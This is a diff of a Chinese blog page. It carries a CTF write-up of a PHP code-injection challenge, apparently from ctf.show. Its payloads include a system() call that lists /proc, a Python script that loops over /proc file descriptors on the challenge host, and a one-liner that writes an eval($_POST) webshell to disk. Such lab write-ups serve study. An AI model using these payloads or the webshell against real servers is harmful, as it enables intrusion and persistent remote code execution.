@@ -75,6 +75,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/test.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 
 
@@ -272,9 +273,9 @@
 <p>本文尝试用多个解法</p>
 <h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>因为预加载文件会把那个文件的里定义的变量加载到当前文件的变量表里，所以可以有</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291201525.png" srcset="/img/loading.gif" lazyload alt="image-20220129120114450"></p>
-<h3 id="proc-文件目录获取flag"><a href="#proc-文件目录获取flag" class="headerlink" title="/proc/文件目录获取flag"></a>/proc/文件目录获取flag</h3><p><code>?f=system(&quot;ls /proc/&quot;);</code> 查看正在运行的进程</p>
+<h3 id="x2F-proc-x2F-文件目录获取flag"><a href="#x2F-proc-x2F-文件目录获取flag" class="headerlink" title="&#x2F;proc&#x2F;文件目录获取flag"></a>&#x2F;proc&#x2F;文件目录获取flag</h3><p><code>?f=system(&quot;ls /proc/&quot;);</code> 查看正在运行的进程</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291210025.png" srcset="/img/loading.gif" lazyload alt="image-20220129121033949"></p>
-<p>好吧经过实践这个思路不行,这里 /proc/ 目录下内容所属用户和组都是root,而提供服务的是www-data，自己写的小脚本先贴在这儿</p>
+<p>好吧经过实践这个思路不行,这里 &#x2F;proc&#x2F; 目录下内容所属用户和组都是root,而提供服务的是www-data，自己写的小脚本先贴在这儿</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">120</span>,<span class="hljs-number">130</span>,<span class="hljs-number">7</span>,<span class="hljs-number">76</span>]:<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>        url=<span class="hljs-string">&quot;http://0f8360bf-70b5-485e-a69a-0889ce967e3c.challenge.ctf.show/?f=system(&#x27;nl /proc/%d/fd/%d&#x27;);&quot;</span> %(i,j)<br>        <br>        url=url.<span class="hljs-built_in">format</span>(i,j)<br>        r=requests.get(url=url,)<br>        sleep(<span class="hljs-number">0.5</span>)<br>        result=r.text+url+<span class="hljs-string">&#x27;\n&#x27;</span><br>        output=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>        output.write(result)<br>        <span class="hljs-built_in">print</span>(r)<br>        output.close()<br><br></code></pre></td></tr></table></figure>
 
 <h2 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h2><h3 id="系统命令写马"><a href="#系统命令写马" class="headerlink" title="系统命令写马"></a>系统命令写马</h3><p><code>?f=system(&quot;echo &#39;\n&lt;?php eval(\$_POST[1]);?&gt;&#39;  &gt; 2.php&quot;);</code></p>
@@ -497,95 +498,6 @@
   
 </footer>
 
-<!-- SCRIPTS -->
-<!-- 
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":true,"trickleSpeed":80})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  
-    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
-  
-  
-    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
-  
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-        typing(title);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
- -->
 
 
 
